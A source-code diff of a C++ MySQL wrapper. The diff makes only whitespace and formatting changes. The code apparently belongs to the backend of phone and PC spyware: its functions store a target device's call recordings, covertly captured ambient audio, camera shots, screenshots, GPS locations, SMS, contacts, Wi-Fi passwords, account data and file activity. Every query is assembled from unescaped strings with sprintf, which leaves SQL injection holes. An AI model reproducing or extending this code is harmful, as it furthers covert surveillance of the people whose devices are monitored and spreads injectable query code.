@@ -138,7 +138,7 @@ int MySql::insertOnline(string userid, string clientid) {
 
 
 
-int MySql::insertClient(string username, string mac, string info,string model) {
+int MySql::insertClient(string username, string mac, string info, string model) {
 	char cmd[0x10000];
 
 	int timenow = (int)time(0);
@@ -157,7 +157,7 @@ int MySql::insertClient(string username, string mac, string info,string model) {
 		insertOnline(userid, id);
 
 		int len = sprintf(cmd, "INSERT INTO phone_clients (target,imei,update_ts,model,infos) VALUES ('%s','%s', '%d','%s','%s')",
-			userid.c_str(),mac.c_str(), timenow,model.c_str(), info.c_str());
+			userid.c_str(), mac.c_str(), timenow, model.c_str(), info.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -171,7 +171,7 @@ int MySql::insertClient(string username, string mac, string info,string model) {
 		insertOnline(userid, id);
 
 		int len = sprintf(cmd, "UPDATE phone_clients SET update_ts='%d',model='%s',infos='%s' WHERE id=%s",
-			timenow, model.c_str(),info.c_str(), id.c_str());
+			timenow, model.c_str(), info.c_str(), id.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -186,7 +186,7 @@ int MySql::insertClient(string username, string mac, string info,string model) {
 }
 
 
-int MySql::insertClientFromCmd(string username, string mac,int onlinetype) {
+int MySql::insertClientFromCmd(string username, string mac, int onlinetype) {
 	char cmd[1024];
 	string userid = getIdFromUser(username);
 	if (userid == "")
@@ -199,7 +199,8 @@ int MySql::insertClientFromCmd(string username, string mac,int onlinetype) {
 	if (onlinetype & CLIENT_NETWORK_TYPE_WIFI)
 	{
 		onlinetype = 3;
-	}else if (onlinetype & CLIENT_NETWORK_TYPE_WIRELESS)
+	}
+	else if (onlinetype & CLIENT_NETWORK_TYPE_WIRELESS)
 	{
 		onlinetype = 2;
 	}
@@ -213,14 +214,14 @@ int MySql::insertClientFromCmd(string username, string mac,int onlinetype) {
 	if (id == "")
 	{
 		int len = wsprintfA(cmd, "INSERT INTO phone_clients (target,imei,update_ts,state) VALUES ('%s','%s', '%u','%u')",
-			userid.c_str(), mac.c_str(), timenow,onlinetype);
+			userid.c_str(), mac.c_str(), timenow, onlinetype);
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
 	}
 	else {
 		int len = sprintf(cmd, "UPDATE phone_clients SET imei = '%s',update_ts='%u',state='%u' WHERE id=%s",
-			mac.c_str(), timenow,onlinetype, id.c_str());
+			mac.c_str(), timenow, onlinetype, id.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -247,7 +248,7 @@ vector<vector<string>> MySql::getAllImeiFromUser(string username) {
 
 	char szcmd[1024];
 	wsprintfA(szcmd, "select imei from phone_clients where target='%s'", userid.c_str());
-	
+
 	bool ret = getDatafromDB(szcmd, data);
 	if (ret)
 	{
@@ -318,14 +319,14 @@ int MySql::insertInstallApps(string mac, string name, string package, string ver
 	if (id == "")
 	{
 		int len = sprintf(cmd, "INSERT INTO ph_applist (client_id,name,package,version,ctime,utime,type) VALUES ( %s,'%s','%s','%s','%s','%s','%s')",
-			clientid.c_str(), name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(),type.c_str());
+			clientid.c_str(), name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(), type.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
 	}
 	else {
 		int len = sprintf(cmd, "UPDATE ph_applist SET name='%s',package='%s',version='%s',ctime='%s',utime='%s',type='%s' WHERE id=%s",
-			name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(),type.c_str(), id.c_str());
+			name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(), type.c_str(), id.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -351,7 +352,7 @@ string MySql::getBookmarkID(string clientid, string url) {
 		{
 			return "";
 		}
-		else if (data.at(0).size() <= 0) 
+		else if (data.at(0).size() <= 0)
 		{
 			return "";
 		}
@@ -368,13 +369,13 @@ string MySql::getBookmarkID(string clientid, string url) {
 	}
 }
 
-int MySql::insertBookMark(string username, string mac, string url, string title, string strcount, string ctime,string ts) {
+int MySql::insertBookMark(string username, string mac, string url, string title, string strcount, string ctime, string ts) {
 	char cmd[0x10000];
 
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
 	{
-		wsprintfA(cmd, "insertBookMark getIdFromClient error,imei:%s,user:%s\r\n", mac.c_str(),username.c_str());
+		wsprintfA(cmd, "insertBookMark getIdFromClient error,imei:%s,user:%s\r\n", mac.c_str(), username.c_str());
 		WriteLogFile(cmd);
 		return false;
 	}
@@ -439,7 +440,7 @@ string MySql::getCalllogIDFromNumber(string clientid, string filepath) {
 
 
 //need time format
-int MySql::insertCallAudio(string username, string imei,string number,string timenow, string type,string filepath, int filesize,int duration) {
+int MySql::insertCallAudio(string username, string imei, string number, string timenow, string type, string filepath, int filesize, int duration) {
 	char cmd[1024];
 	string clientid = getIDFromClient(imei);
 	if (clientid == "")
@@ -525,7 +526,7 @@ int MySql::insertCallLog(string username, string mac, string number, string type
 		if (id == "")
 		{
 			int len = wsprintfA(cmd, "INSERT INTO ph_call_record(client_id,number,type,ts,duration) VALUES (%s,'%s','%s','%u','%u')",
-				clientid.c_str(), number.c_str(), type.c_str(),  ts, duration);
+				clientid.c_str(), number.c_str(), type.c_str(), ts, duration);
 			if (0 == mysql_query(&mysqlInstance, cmd)) {
 				return true;
 			}
@@ -556,7 +557,7 @@ int MySql::insertCallLog(string username, string mac, string number, string type
 
 
 //need time format
-int MySql::insertCamera(string mac, string type, string timenow,string filepath) {
+int MySql::insertCamera(string mac, string type, string timenow, string filepath) {
 	char cmd[1024];
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
@@ -583,13 +584,13 @@ int MySql::insertCamera(string mac, string type, string timenow,string filepath)
 	wsprintfA(cmd, "insertCamera error,errorno:%u,errorinfo:%s,filepath:%s,mac:%s\r\n",
 		errorNum, errorInfo, filepath.c_str(), mac.c_str());
 	WriteLogFile(cmd);
-	
+
 	return false;
 }
 
 
 //一个名字多个号码也是可能的，多个名字对应一个号码也是可能的
-string MySql::getContactID(string clientid,string number, string name) {
+string MySql::getContactID(string clientid, string number, string name) {
 	char szcmd[1024];
 	//error no:1267,desc:Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation '='
 // 	wsprintfA(szcmd, "select id from ph_contacts where client_id = '%s' and number = '%s' and name = '%s'", 
@@ -623,17 +624,17 @@ string MySql::getContactID(string clientid,string number, string name) {
 }
 
 
-int MySql::insertContact(string username,string mac, string name, string number) {
+int MySql::insertContact(string username, string mac, string name, string number) {
 	char cmd[1024];
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
 	{
 		wsprintfA(cmd, "insertContact getIdFromClient:%s error\r\n", mac.c_str());
 		WriteLogFile(cmd);
-		return false; 
+		return false;
 	}
 
-	string id = getContactID(clientid,number, name);
+	string id = getContactID(clientid, number, name);
 	if (id == "")
 	{
 		int len = wsprintfA(cmd, "INSERT INTO ph_contacts (client_id,name,number) VALUES ( %s, '%s','%s')",
@@ -656,8 +657,8 @@ int MySql::insertContact(string username,string mac, string name, string number)
 }
 
 //need time format
-int MySql::insertEnviromentAudio(string username, string mac,string timenow,string filepath,int filesize,int duration) {
-	string clientid = getIDFromClient( mac);
+int MySql::insertEnviromentAudio(string username, string mac, string timenow, string filepath, int filesize, int duration) {
+	string clientid = getIDFromClient(mac);
 	if (clientid != "")
 	{
 		char cmd[1024];
@@ -679,7 +680,7 @@ int MySql::insertEnviromentAudio(string username, string mac,string timenow,stri
 	}
 	else {
 		char szout[1024];
-		wsprintfA(szout,"insertEnviromentAudio getIdFromClient:%s error\r\n",mac.c_str());
+		wsprintfA(szout, "insertEnviromentAudio getIdFromClient:%s error\r\n", mac.c_str());
 		WriteLogFile(szout);
 
 		errorIntoMySQL();
@@ -716,7 +717,7 @@ string MySql::getAllFilesID(string clientid, string filename) {
 }
 
 
-int MySql::insertAllFiles(string username, string mac,string filename, string filepath, int filesize,int type) {
+int MySql::insertAllFiles(string username, string mac, string filename, string filepath, int filesize, int type) {
 	char cmd[1024];
 	string clientid = getIDFromClient(mac);
 	if (clientid != "")
@@ -727,14 +728,14 @@ int MySql::insertAllFiles(string username, string mac,string filename, string fi
 		if (id == "")
 		{
 			int len = wsprintfA(cmd, "INSERT INTO ph_files(client_id,type,name,path,size) VALUES (%s,'%u', '%s', '%s', '%u')",
-				clientid.c_str(),type, filename.c_str(), filepath.c_str(), filesize);
+				clientid.c_str(), type, filename.c_str(), filepath.c_str(), filesize);
 			if (0 == mysql_query(&mysqlInstance, cmd)) {
 				return true;
 			}
 		}
 		else {
 			int len = sprintf(cmd, "UPDATE ph_files SET type='%u', name='%s',path='%s',size='%u' WHERE id=%s",
-				type,filename.c_str(), filepath.c_str(),filesize, id.c_str());
+				type, filename.c_str(), filepath.c_str(), filesize, id.c_str());
 			if (0 == mysql_query(&mysqlInstance, cmd)) {
 				return true;
 			}
@@ -784,7 +785,7 @@ string MySql::getLocID(string clientid, int utc) {
 }
 
 //need time format
-int MySql::insertLocation(string username, string mac, string lat, string lon, string timenow,string addr) {
+int MySql::insertLocation(string username, string mac, string lat, string lon, string timenow, string addr) {
 	char cmd[1024];
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
@@ -808,9 +809,9 @@ int MySql::insertLocation(string username, string mac, string lat, string lon, s
 	{
 		addr = BaiduLocation::getAddrFromLoc(lat, lon);
 	}
-	
+
 	int len = wsprintfA(cmd, "INSERT INTO ph_gps_info (client_id,ts,lat,lon,addr) VALUES ( %s,'%u','%s','%s','%s')",
-		clientid.c_str(), utc, lat.c_str(), lon.c_str(),addr.c_str());
+		clientid.c_str(), utc, lat.c_str(), lon.c_str(), addr.c_str());
 	if (0 == mysql_query(&mysqlInstance, cmd)) {
 		return true;
 	}
@@ -848,7 +849,7 @@ string MySql::getMsgID(string clientid, string mid) {
 	}
 }
 
-int MySql::insertMsg(string mac, string name, string number, string type, string timenow, string data,string msgid) {
+int MySql::insertMsg(string mac, string name, string number, string type, string timenow, string data, string msgid) {
 	char cmd[0x1000];
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
@@ -857,7 +858,7 @@ int MySql::insertMsg(string mac, string name, string number, string type, string
 		WriteLogFile(cmd);
 		return false;
 	}
-	
+
 	DWORD msgtime = 0;
 
 	msgtime = loctime2utc(timenow.c_str());		//2019-06-25 10:18:00
@@ -882,7 +883,7 @@ int MySql::insertMsg(string mac, string name, string number, string type, string
 	WriteLogFile(cmd);
 
 	wsprintfA(cmd, "insertMsg mac:%s,name:%s,number:%s,type:%s,msgtime:%u,data:%s,msgid:%s error\r\n",
-		mac.c_str(),name.c_str(),number.c_str(),type.c_str(),msgtime,data.c_str(),msgid.c_str());
+		mac.c_str(), name.c_str(), number.c_str(), type.c_str(), msgtime, data.c_str(), msgid.c_str());
 	WriteLogFile(cmd);
 	return false;
 }
@@ -923,7 +924,7 @@ string MySql::getProcessID(string clientid, string pname) {
 	}
 }
 
-int MySql::insertProcesses(string username,string mac, string pname, string pid, string uid) {
+int MySql::insertProcesses(string username, string mac, string pname, string pid, string uid) {
 	char cmd[1024];
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
@@ -943,11 +944,11 @@ int MySql::insertProcesses(string username,string mac, string pname, string pid,
 		}
 	}
 	else {
-// 		int len = sprintf(cmd, "UPDATE ph_proc SET pid='%s',name='%s',userid='%s' WHERE client_id=%s and pid='%s'",
-// 			pid.c_str(), pname.c_str(), uid.c_str(), clientid.c_str(),pid.c_str());
-// 		if (0 == mysql_query(&mysqlInstance, cmd)) {
- 			return true;
-// 		}
+		// 		int len = sprintf(cmd, "UPDATE ph_proc SET pid='%s',name='%s',userid='%s' WHERE client_id=%s and pid='%s'",
+		// 			pid.c_str(), pname.c_str(), uid.c_str(), clientid.c_str(),pid.c_str());
+		// 		if (0 == mysql_query(&mysqlInstance, cmd)) {
+		return true;
+		// 		}
 	}
 
 	WriteLogFile(cmd);
@@ -1006,7 +1007,7 @@ bool MySql::insertFiles(string mac, string name, string path, int type, int size
 	else {
 		//replace语句不能根据where子句来定位要被替换的记录
 		int len = wsprintfA(cmd, "UPDATE ph_sd_files SET name = '%s',path='%s' WHERE id = %s ",
-			name.c_str(), path.c_str(),id.c_str());
+			name.c_str(), path.c_str(), id.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -1023,7 +1024,7 @@ bool MySql::insertFiles(string mac, string name, string path, int type, int size
 
 
 //need time format
-int MySql::insertScreenCap(string username,string mac, string path,string timenow) {
+int MySql::insertScreenCap(string username, string mac, string path, string timenow) {
 	char cmd[1024];
 
 	string clientid = getIDFromClient(mac);
@@ -1043,7 +1044,7 @@ int MySql::insertScreenCap(string username,string mac, string path,string timeno
 	if (0 == mysql_query(&mysqlInstance, cmd)) {
 		return true;
 	}
-	
+
 	WriteLogFile(cmd);
 	errorIntoMySQL();
 	wsprintfA(cmd, "insertScreenCap error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
@@ -1054,7 +1055,7 @@ int MySql::insertScreenCap(string username,string mac, string path,string timeno
 
 
 
-string MySql::getIdFromWifi(string clientid,string list) {
+string MySql::getIdFromWifi(string clientid, string list) {
 	char szcmd[1024];
 	wsprintfA(szcmd, "select client_id from ph_wifi_info where client_id=%s", clientid.c_str());
 	vector<vector<string>> data;
@@ -1081,7 +1082,7 @@ string MySql::getIdFromWifi(string clientid,string list) {
 }
 
 
-int MySql::insertWifi(string username,string mac, string list, string password) {
+int MySql::insertWifi(string username, string mac, string list, string password) {
 	char cmd[0x10000];
 
 	string clientid = getIDFromClient(mac);
@@ -1092,7 +1093,7 @@ int MySql::insertWifi(string username,string mac, string list, string password) 
 		return false;
 	}
 
-	string id = getIdFromWifi(clientid,list);
+	string id = getIdFromWifi(clientid, list);
 	if (id == "")
 	{
 		int len = sprintf(cmd, "INSERT INTO ph_wifi_info (client_id,list) VALUES ('%s', '%s')",
@@ -1148,18 +1149,18 @@ string MySql::getIdFromWifi2(string clientid, string list) {
 
 
 int MySql::insertWifi2(string username, string mac, string list, string password) {
-	
+
 	char szlog[1024];
 
-	if (list.length()>MAX_WIFI_DATA_SIZE -1024)
+	if (list.length() > MAX_WIFI_DATA_SIZE - 1024)
 	{
-		
+
 		wsprintfA(szlog, "insertWifi2 list size:%d error\r\n", list.length());
 		WriteLogFile(szlog);
 
 		return false;
 	}
-	char * cmd = new char[MAX_WIFI_DATA_SIZE];
+	char* cmd = new char[MAX_WIFI_DATA_SIZE];
 
 	string clientid = getIDFromClient(mac);
 	if (clientid == "")
@@ -1225,7 +1226,7 @@ string MySql::getIdFromAccount(string clientid) {
 
 
 
-int MySql::insertAccount(string username, string mac, string infos,string type) {
+int MySql::insertAccount(string username, string mac, string infos, string type) {
 	char cmd[1024];
 
 	string clientid = getIDFromClient(mac);
@@ -1255,7 +1256,7 @@ int MySql::insertAccount(string username, string mac, string infos,string type) 
 	if (id == "")
 	{
 		int len = wsprintfA(cmd, "INSERT INTO ph_accounts (client_id,%s) VALUES ('%s', '%s')",
-			app.c_str(),clientid.c_str(), infos.c_str());
+			app.c_str(), clientid.c_str(), infos.c_str());
 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
 		}
@@ -1294,7 +1295,7 @@ int MySql::insertFilesOper(string mac, string fullname) {
 
 	replaceSplashAndEnterAndQuot(fullname);
 
-	int len = wsprintfA(cmd, "INSERT INTO pc_filemonitor (client_id,content) VALUES ( %s, '%s')",clientid.c_str(), fullname.c_str());
+	int len = wsprintfA(cmd, "INSERT INTO pc_filemonitor (client_id,content) VALUES ( %s, '%s')", clientid.c_str(), fullname.c_str());
 	if (0 == mysql_query(&mysqlInstance, cmd)) {
 		return true;
 	}
@@ -1325,7 +1326,7 @@ bool MySql::connectMySQL(char* server, char* username, char* password, char* dat
 		wsprintfA(szout, "connectMySQL error no:%u,desc:%s\r\n", errorNum, errorInfo);
 		WriteLogFile(szout);
 	}
-		
+
 	return false;
 }
 
@@ -1342,7 +1343,7 @@ bool MySql::useDatabase(std::string dbname)
 	else {
 		errorIntoMySQL();
 		char szout[1024];
-		wsprintfA(szout,"use database error no:%u,desc:%s\r\n",errorNum,errorInfo);
+		wsprintfA(szout, "use database error no:%u,desc:%s\r\n", errorNum, errorInfo);
 		WriteLogFile(szout);
 		return false;
 	}
@@ -1379,7 +1380,7 @@ bool MySql::createdbTable(const std::string& query)
 }
 
 
-MySql::MySql():errorNum(0), errorInfo("ok")
+MySql::MySql() :errorNum(0), errorInfo("ok")
 {
 	//errorNum = 0;
 	//lstrcpyA(errorInfo, "ok");
@@ -1387,7 +1388,7 @@ MySql::MySql():errorNum(0), errorInfo("ok")
 	char szout[1024];
 	bool ret = false;
 
-	MYSQL *tmpsql = mysql_init(&mysqlInstance);
+	MYSQL* tmpsql = mysql_init(&mysqlInstance);
 	if (tmpsql <= 0)
 	{
 		errorNum = -1;
@@ -1453,7 +1454,7 @@ string MySql::checkSingleID(string key, string value, string table) {
 
 bool MySql::getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data)
 {
-	
+
 	if (0 != mysql_query(&mysqlInstance, queryStr.c_str()))
 	{
 		char szout[1024];
@@ -1463,7 +1464,7 @@ bool MySql::getDatafromDB(string queryStr, std::vector<std::vector<std::string> 
 		return false;
 	}
 
-	MYSQL_RES * result = mysql_store_result(&mysqlInstance);
+	MYSQL_RES* result = mysql_store_result(&mysqlInstance);
 	if (result <= 0)
 	{
 		//mysql_free_result(result);
@@ -1557,7 +1558,7 @@ MySql::~MySql()
 
 bool MySql::setting() {
 	int value = 1;
-	mysql_options(&mysqlInstance, MYSQL_OPT_RECONNECT, (char *)&value);
+	mysql_options(&mysqlInstance, MYSQL_OPT_RECONNECT, (char*)&value);
 
 	string cmd = "set global max_allowed_packet=1024*1024*1024";
 	if (mysql_query(&mysqlInstance, cmd.c_str())) {
@@ -1690,7 +1691,7 @@ string MySql::getListFromWifi(string no) {
 int MySql::deleteUser(string username) {
 	char cmd[1024];
 
-	char * cmdformat = "DELETE FROM users WHERE name='%s'";
+	char* cmdformat = "DELETE FROM users WHERE name='%s'";
 	wsprintfA(cmd, cmdformat, username.c_str());
 	if (mysql_query(&mysqlInstance, cmd)) {
 		return false;
@@ -1707,7 +1708,7 @@ int MySql::removedata(string imei) {
 		return false;
 	}
 
-	char * cmdformat = "DELETE FROM client_log WHERE client_id='%s'";
+	char* cmdformat = "DELETE FROM client_log WHERE client_id='%s'";
 	wsprintfA(cmd, cmdformat, id.c_str());
 	if (mysql_query(&mysqlInstance, cmd)) {
 		return false;
@@ -1856,47 +1857,47 @@ int MySql::removedata(string imei) {
 int MySql::modifyInfo() {
 	char szcmd[0x10000];
 
-	for (int i = 0;i < 1000; i ++)
+	for (int i = 0; i < 1000; i++)
 	{
 		string id = getIDFromClient(i);
 		if (id != "")
 		{
-// 			string list = getListFromWifi(id);
-// 			if (list != "")
-// 			{
-// 				if (list.at(0) == '{' && list.back() == '}')
-// 				{
-// 					list.at(0) = '[';
-// 					list.back() = ']';
-// 					//list = '{' + list + '}';
-// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
-// 						list.c_str(), id.c_str());
-// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
-// 
-// 					}
-// 				}
-// 				else 
-// 					if (list.at(1) == '[' && list.at(list.length() - 2) == ']')
-// 				{
-// 					list.at(1) = ' ';
-// 					list.at(list.length() - 2) = ' ';
-// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
-// 						list.c_str(), id.c_str());
-// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
-// 
-// 					}
-// 				}else 
-// 						if (list.at(0) == '[' && list.back() == ']')
-// 				{
-// 					list.at(0) = '{';
-// 					list.back() = '}';
-// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
-// 						list.c_str(), id.c_str());
-// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
-// 
-// 					}
-// 				}
-//			}
+			// 			string list = getListFromWifi(id);
+			// 			if (list != "")
+			// 			{
+			// 				if (list.at(0) == '{' && list.back() == '}')
+			// 				{
+			// 					list.at(0) = '[';
+			// 					list.back() = ']';
+			// 					//list = '{' + list + '}';
+			// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
+			// 						list.c_str(), id.c_str());
+			// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
+			// 
+			// 					}
+			// 				}
+			// 				else 
+			// 					if (list.at(1) == '[' && list.at(list.length() - 2) == ']')
+			// 				{
+			// 					list.at(1) = ' ';
+			// 					list.at(list.length() - 2) = ' ';
+			// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
+			// 						list.c_str(), id.c_str());
+			// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
+			// 
+			// 					}
+			// 				}else 
+			// 						if (list.at(0) == '[' && list.back() == ']')
+			// 				{
+			// 					list.at(0) = '{';
+			// 					list.back() = '}';
+			// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
+			// 						list.c_str(), id.c_str());
+			// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
+			// 
+			// 					}
+			// 				}
+			//			}
 
 			string oldinfos = getInfosFromClient(id);
 			if (oldinfos != "")
@@ -1905,7 +1906,7 @@ int MySql::modifyInfo() {
 				string newinfos = JsonSplit::slitInfomation(oldinfos, model);
 
 				int len = sprintf(szcmd, "UPDATE phone_clients SET model='%s',infos='%s' WHERE id=%s",
-						model.c_str(), newinfos.c_str(), id.c_str());
+					model.c_str(), newinfos.c_str(), id.c_str());
 				if (0 == mysql_query(&mysqlInstance, szcmd)) {
 
 				}
